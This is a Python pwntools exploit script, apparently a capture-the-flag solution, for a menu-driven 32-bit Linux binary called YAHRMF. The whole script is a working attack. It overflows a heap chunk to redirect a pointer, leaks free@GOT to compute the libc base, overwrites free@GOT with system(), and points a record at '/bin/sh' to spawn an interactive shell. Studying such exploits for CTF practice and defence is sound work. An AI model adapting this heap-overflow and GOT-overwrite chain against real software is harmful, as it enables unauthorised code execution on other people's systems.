from pwn import *
import sys 

context(terminal=['terminator', '-e'])
context(os='linux', arch='i386',endian="little")

e = ELF("./YAHRMF.dms")
libc = ELF("./libc.so.6")
#context.log_level = 'DEBUG'

if len(sys.argv) < 2:
	print("[!] Invalid options")
	print("[*] Usage: python exploit.py (debug/live)")
elif sys.argv[1] == "debug":
	p = process('./YAHRMF.dms', env={"LD_PRELOAD":"./libc.so.6"})
	gdb.attach(p, "heap-analysis-helper")
elif sys.argv[1] == "live":
	p = process('./YAHRMF.dms', env={"LD_PRELOAD":"./libc.so.6"})
else:
	print("[!] Invalid option")
	sys.exit(1)


def alloc(length, name, age):

	log.info("Allocating")
	p.sendline("1")
	p.recvuntil("length: ")
	p.sendline(length)
	p.recvuntil("name: ")
	p.sendline(name)
	p.recvuntil("age: ")
	p.sendline(age)
	p.recvuntil("choice: ")


def edit(entry, newLength, newName):
	
	log.info("Editing")
	p.sendline("2")
	p.recvuntil("(0-based): ")
	p.sendline(entry)
	p.recvuntil("length: ")
	p.sendline(newLength)
	p.recvuntil("name: ")
	p.sendline(newName)
	p.recvuntil("choice: ")

def view(entry):

	log.info("Viewing")
	p.sendline("3")
	p.recvuntil("(0-based): ")
	p.sendline(entry)
	return p.recvuntil("choice: ")

def delete(entry):

	log.info("Deleting")
	p.sendline("4")
	p.recvuntil("(0-based): ")
	p.sendline(entry)
	p.recvuntil("choice: ")


def exploit():

	p.recvuntil("choice: ")

	log.info("Performing Leak")

	person1 = "A" * 10 # chunk data
	person2 = "B" * 10
	person3 = "C" * 10

	offset= "D" * 32 # offsets inside of chunks

	payload = offset + p32(e.symbols["printPerson"]) + p32(e.got["free"]) # payload

	alloc("20", person1, "20") # allocating chunks
	alloc("200", person2, "20")
	alloc("20", person3, "20")

	edit("0", "4000", payload) # overflow into chunk 1 (execute function pointer of printPerson and overwrite name ptr with free@GOT)

	leak = view("1")[6:10] # Display (leak)

	log.success("Leaked Free: " + hex(u32(leak)))

	libc_base = u32(leak) - libc.symbols["free"] # calculate offsets

	log.success("Libc Base: " + hex(libc_base)) # get libc_base 

	offset = "E" * 36 # exec chunk offset

	payload = offset+p32(e.got["free"]) # payload to free@GOT (GOT overwrite)

	edit("0", "4000", payload) # overflow into chunk 1 and write free@GOT into chunk

	edit("1", "10", p32(libc_base+libc.symbols["system"])) # overwrite free@GOT with system()

	execute = offset+p32(libc_base+next(libc.search("/bin/sh\x00"))) # find /bin/sh

	log.success("/bin/sh: " + hex(u32(p32(libc_base+next(libc.search("/bin/sh\x00"))))))

	edit("0", "4000", execute) # Overwrite name address with /bin/sh (system(/bin/sh))

	log.success("Popping shell")
	
	p.sendline("4") # trigger code exec
	p.recvuntil("(0-based): ")
	p.sendline("1")                                   

	p.interactive()

exploit()